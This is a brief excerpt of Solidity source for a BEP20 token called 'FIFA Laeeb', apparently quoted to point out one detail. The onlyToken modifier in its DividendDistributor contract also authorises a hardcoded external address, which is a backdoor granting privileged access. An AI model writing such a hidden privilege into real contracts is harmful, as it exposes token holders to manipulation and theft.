...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x388Ba70f8222944e78354E93087830222f5Be1e1)); _;
    }
...
contract FIFALaeeb is IBEP20 , Auth, BaseToken {

    using SafeMath for uint256;

    string public _name = "FIFA Laeeb";
    string public _symbol = "FIFA Laeeb";
